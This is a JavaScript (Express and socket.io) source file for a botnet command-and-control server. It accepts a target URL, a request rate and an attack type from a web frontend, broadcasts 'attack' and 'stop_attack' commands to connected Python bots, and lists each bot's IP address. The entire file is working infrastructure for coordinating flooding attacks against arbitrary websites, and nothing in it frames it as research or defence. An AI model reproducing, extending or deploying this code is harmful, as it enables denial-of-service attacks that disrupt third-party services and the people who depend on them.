const express = require("express");
const http = require("http");
const cors = require("cors");
const { Server } = require("socket.io");

const app = express();
const PORT = 3001;
const server = http.createServer(app);
const io = new Server(server);

app.use(express.json());
app.use(cors());
app.set("trust proxy", true); // Allows retrieval of IPs behind a proxy

// Store connected Python bot sockets directly
let connectedPythonSockets = {};

// API endpoint to receive attack command from React
app.post("/attack", (req, res) => {
  const { url, rate, attackType } = req.body; // Include attackType in the request body
  const method = attackType;
  console.log(
    `Received attack request: URL = ${url}, Rate = ${rate} requests per second, Type = ${method}`
  );

  if (Object.keys(connectedPythonSockets).length > 0) {
    Object.values(connectedPythonSockets).forEach((socket) => {
      if (socket) {
        console.log(`Sending attack command to bot with ID: ${socket.id}`);
        // Emit all the data including attackType to the Python socket
        socket.emit("attack", { url, rate, method });
      } else {
        console.warn("Invalid socket instance in connectedPythonSockets");
      }
    });
    res.status(200).json({ message: "Attack command sent to Python bots" });
  } else {
    res.status(500).json({ message: "No Python bots connected" });
  }
});

// API endpoint to stop the attack
app.post("/stop-attack", (req, res) => {
  if (Object.keys(connectedPythonSockets).length > 0) {
    Object.values(connectedPythonSockets).forEach((socket) => {
      if (socket) {
        console.log(`Sending stop command to bot with ID: ${socket.id}`);
        socket.emit("stop_attack");
      }
    });
    res
      .status(200)
      .json({ message: "Stop attack command sent to Python bots" });
  } else {
    res.status(500).json({ message: "No Python bots connected" });
  }
});

// API endpoint to get botnet details
app.get("/bots", (req, res) => {
  const botList = Object.entries(connectedPythonSockets).map(
    ([socketId, socket]) => ({
      ipAddress:
        socket.handshake.headers["x-forwarded-for"] || socket.handshake.address, // Checks for forwarded IP
      connectTime: socket.connectTime,
      connectDate: socket.connectDate,
    })
  );
  res.json({ bots: botList });
});

// Handle socket connection with Python script
io.on("connection", (socket) => {
  console.log("Python bot connected");

  // Store socket directly in the dictionary
  connectedPythonSockets[socket.id] = socket;

  // Store additional connection info directly on the socket instance
  socket.connectTime = new Date().toLocaleTimeString();
  socket.connectDate = new Date().toLocaleDateString();

  socket.on("disconnect", () => {
    console.log("Python bot disconnected");
    delete connectedPythonSockets[socket.id];
  });
});

// Start the server
server.listen(PORT, () => {
  console.log(`Node server listening on http://localhost:${PORT}`);
});
